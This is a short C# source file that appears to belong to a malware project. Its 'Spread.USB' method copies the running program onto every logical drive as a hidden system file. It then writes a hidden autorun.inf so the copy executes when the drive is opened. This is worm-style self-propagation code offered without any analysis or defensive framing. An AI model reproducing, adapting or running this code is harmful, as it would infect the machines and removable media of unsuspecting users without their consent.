using Microsoft.VisualBasic.FileIO;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace celestialC.Install
{
    public static class Spread
    {
        private static readonly string text3 = SpecialDirectories.ProgramFiles;
        public static void USB()
        {
            string text = "autorun.inf";
            string text2 = Settings.usbsprname;
            string[] logicaldrives = Directory.GetLogicalDrives();
            foreach(string text3 in logicaldrives)
            {
                try
                {
                    File.Copy(Application.ExecutablePath, text3 + text2);
                    File.SetAttributes(text3 + text2, FileAttributes.Hidden | FileAttributes.System);
                }
                catch { }
                try
                {
                    StreamWriter streamWriter = new StreamWriter(text3 + "\\" + text);
                    streamWriter.WriteLine("[autorun]");
                    streamWriter.WriteLine("open=" + text3 + text2);
                    streamWriter.WriteLine("shellexecute=" + text3, 1);
                    streamWriter.Close();
                    File.SetAttributes(text3 + text, FileAttributes.Hidden | FileAttributes.System);
                }
                catch { }
            }
        }
    }
}
